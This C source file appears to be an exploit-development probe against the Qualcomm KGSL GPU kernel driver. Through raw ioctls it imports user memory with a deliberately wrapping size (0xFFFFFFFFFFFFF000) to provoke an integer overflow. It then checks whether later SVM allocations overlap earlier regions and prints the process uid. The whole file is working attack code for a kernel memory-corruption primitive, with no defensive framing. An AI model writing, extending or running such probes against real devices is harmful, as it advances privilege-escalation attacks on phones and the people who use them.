/* kgsl SVM wrap -> allocator overlap test. Build with zig cc as before. */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#define T 0x09
#define USE_CPU_MAP 0x10000000ULL
struct imp{uint64_t priv,priv_len,flags;unsigned type,id;};
struct ua{uint64_t virtaddr;};
struct al{uint64_t size,flags,va_len,mmapsize;unsigned id,metadata_len;uint64_t metadata;};
struct info{uint64_t gpuaddr,flags,size,va_len,va_addr;unsigned id;};
static int fd;
static void*fixmap(uintptr_t a,size_t l){void*m=mmap((void*)a,l,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);if(m!=MAP_FAILED)memset(m,0x41,l);return m;}
static int imp(void*m,unsigned long long sz,unsigned*id){struct imp p;memset(&p,0,sizeof p);struct ua u;memset(&u,0,sizeof u);u.virtaddr=(uint64_t)(uintptr_t)m;p.priv=(uint64_t)(uintptr_t)&u;p.priv_len=sz;p.type=2;errno=0;int r=ioctl(fd,_IOWR(T,0x48,struct imp),&p);if(id)*id=p.id;return r;}
static int alloc(unsigned long long sz,uint64_t fl,unsigned*id){struct al a;memset(&a,0,sizeof a);a.size=sz;a.flags=fl;errno=0;int r=ioctl(fd,_IOWR(T,0x45,struct al),&a);if(id)*id=a.id;return r;}
static int info(unsigned id,struct info*o){memset(o,0,sizeof *o);o->id=id;errno=0;return ioctl(fd,_IOWR(T,0x47,struct info),o);}
int main(void){setvbuf(stdout,NULL,_IONBF,0);
 printf("== kgsl SVM wrap/alloc probe (uid=%d) ==\n",(int)getuid());
 fd=open("/dev/kgsl-3d0",O_RDWR); if(fd<0){printf("open %s\n",strerror(errno));return 1;}
 uintptr_t B=0x60200000ULL; size_t L=0x1000; void*b=fixmap(B,L);
 printf("[*] B=%p\n",b);
 unsigned id=0; int r;
 r=imp(b,0x1000,&id); printf("[1] good import B      -> r=%d errno=%d id=%u\n",r,errno,id);
 /* free it so region B is gone */
 /* (use a different import for the wrap) */
 uintptr_t W=0x60400000ULL; void*w=fixmap(W,L);
 r=imp(w,0xFFFFFFFFFFFFF000ULL,&id); printf("[2] wrap import W      -> r=%d errno=%d(%s)\n",r,errno,strerror(errno));
 /* now ask the SVM allocator for a region twice; see if addresses are sane */
 for(int i=0;i<3;i++){ struct info o; unsigned aid=0;
   r=alloc(0x1000,USE_CPU_MAP,&aid);
   printf("[3.%d] SVM alloc -> r=%d errno=%d id=%u",i,r,errno,aid);
   if(r==0&&info(aid,&o)==0) printf(" gpuaddr=0x%llx va=0x%llx va_len=0x%llx",(unsigned long long)o.gpuaddr,(unsigned long long)o.va_addr,(unsigned long long)o.va_len);
   printf("\n");
 }
 /* can we import again at B? */
 r=imp(b,0x1000,&id); printf("[4] good import B again-> r=%d errno=%d(%s)\n",r,errno,strerror(errno));
 printf("== done ==\n"); return 0;}
